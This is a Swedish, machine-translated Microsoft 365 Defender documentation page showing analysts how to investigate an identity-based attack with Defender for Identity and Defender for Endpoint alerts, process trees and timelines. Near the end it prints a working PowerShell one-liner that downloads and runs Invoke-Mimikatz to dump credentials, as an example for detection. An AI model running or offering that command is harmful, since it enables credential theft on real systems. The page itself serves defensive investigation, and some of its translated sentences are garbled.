---
title: Exempel på en identitetsbaserad attack
description: Gå igenom en exempelanalys av en identitetsbaserad attack.
keywords: incidenter, varningar, undersöker, korrelation, attack, datorer, enheter, användare, identiteter, identiteter, postlåda, e-post, 365, microsoft, m365, incidentsvar, cyberattack
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 204530b8b4a87215053ddcb0434e40e45271da3d
ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
ms.translationtype: MT
ms.contentlocale: sv-SE
ms.lasthandoff: 06/08/2021
ms.locfileid: "52841012"
---
# <a name="example-of-an-identity-based-attack"></a>Exempel på en identitetsbaserad attack

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Gäller för:**
- Microsoft 365 Defender

Microsoft Defender för identitet kan hjälpa till att identifiera skadliga försök att avslöja identiteter i organisationen. Eftersom Defender för identitet integreras med Microsoft 365 Defender kan säkerhetsanalytiker se hot som kommer in från Defender för identitet, till exempel misstänkta Netlogon-behörighetsförsök.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analysera attacken i Microsoft Defender för identitet

Microsoft 365 Med Defender kan analytiker filtrera aviseringar efter identifieringskälla **på fliken** Aviseringar på sidan Incidenter. I följande exempel filtreras identifieringskällan till **Defender för identitet.** 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Exempel på filtrering av identifieringskällan för Defender för identitet":::

Om du **väljer den misstänkta overpass-the-hash-attackvarningen** går du till en sida i Microsoft Cloud App Security som visar mer detaljerad information. Du kan alltid ta reda på mer  om en avisering eller [](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) attack genom att välja Läs mer om den här aviseringstypen för att läsa en beskrivning av attacken samt åtgärdsförslag.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Exempel på misstänkt överpass-hash-attackvarning"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Undersöker samma attack i Microsoft Defender för Endpoint

En analytiker kan också använda Defender för Endpoint om du vill veta mer om aktiviteten på en slutpunkt. Välj incidenten i incidentkön och välj sedan **fliken** Aviseringar. Härifrån kan de även identifiera identifieringskällan. En identifieringskälla som heter Identifiering och åtgärd på slutpunkt det här kallas slutpunktsidentifiering och -svar, som är Defender för Slutpunkt. Härifrån väljer analytikern en avisering som identifieras av Identifiering och åtgärd på slutpunkt.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Exempel på identifiering och svar av slutpunkt i Defender för slutpunkt"::: 

På aviseringssidan visas olika relevant information, till exempel den påverkade enhetens namn, användarnamn, status för automatisk undersökning och aviseringsinformationen. I varningsartikeln visas en visuell representation av processträdet. Processträdet är en hierarkisk representation av överordnade och underordnade processer som är relaterade till aviseringen.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Exempel på ett aviseringsprocessträd i Defender för Slutpunkt"::: 

Varje process kan utökas för att visa ytterligare information. Information som en analytiker kan se är de faktiska kommandon som har angetts som en del av ett skadligt skript, utgående anslutnings-IP-adresser och annan användbar information.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Exempel på processinformation i Defender för Slutpunkt":::
 
Genom att **välja Visa på tidslinjen** kan en analytiker granska nedåt ytterligare för att fastställa den exakta tiden för kompromissen. 

Microsoft Defender för Endpoint kan identifiera många skadliga filer och skript. På grund av många legitima användningsområden för utgående anslutningar, PowerShell och kommandoradsaktivitet anses dock en del aktivitet vara aktiv tills den skapar en skadlig fil eller aktivitet. Därför hjälper användning av tidslinjen analytiker att sätta aviseringen i sitt sammanhang med den omgivande aktiviteten för att fastställa den ursprungliga källan eller tiden för attacken som annars döljs av vanliga filsystem och användaraktivitet. 

För att göra detta skulle en analytiker börja vid tiden för aviseringsidentifiering (i rött) och rulla nedåt bakåt i tiden för att avgöra när den ursprungliga aktiviteten som ledde till den skadliga aktiviteten faktiskt startade. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Exempel på att starta vid tiden för aviseringsidentifiering"::: 

Det är viktigt att förstå och urskilja vanlig aktivitet, till exempel Windows Uppdatera anslutningar, Windows Aktiveringstrafik för betrodd programvara, andra vanliga anslutningar till Microsoft-webbplatser, Internetaktivitet från tredje part, Microsoft Endpoint Configuration Manager-aktivitet och annan aktivitet på misstänkta webbplatser. Ett sätt att uppnå det här är att använda tidslinjefilter. Det finns många filter som kan markera viss aktivitet när du filtrerar bort något som analytikern inte vill visa. 

I bilden nedan har analytikern filtrerats för att endast visa nätverks- och processhändelser. Då kan analytikern se nätverksanslutningar och processer kring händelsen där Anteckningar upprättat en anslutning med en IP-adress, vilket vi också såg i processträdet. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Exempel på hur Anteckningar användes för att skapa en skadlig utgående anslutning"::: 

I den här händelsen Anteckningar en skadlig utgående anslutning. Men ofta används bara iexplorer.exe för att upprätta anslutningar för att ladda ned en skadlig nyttolast eftersom iexplorer.exe vanligtvis anses vara vanlig webbläsaraktivitet.

Ett annat objekt att leta efter på tidslinjen skulle vara PowerShell-användningsområden för utgående anslutningar. Analytikern letar efter lyckade PowerShell-anslutningar med kommandon som följt av en utgående anslutning till `IEX (New-Object Net.Webclient)` en webbplats som är värd för en skadlig fil. 

I följande exempel användes PowerShell till att ladda ned och köra Mimikatz från en webbplats:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
En analytiker kan snabbt söka efter nyckelord genom att skriva in nyckelordet i sökfältet för att endast visa händelser som skapats med PowerShell. 

## <a name="next-step"></a>Nästa steg

Se sökvägen till nätfiskeundersökningen. [](first-incident-path-phishing.md)

## <a name="see-also"></a>Se även

- [Översikt över incidenter](incidents-overview.md)
- [Hantera incidenter](manage-incidents.md)
- [Undersöka incidenter](investigate-incidents.md)
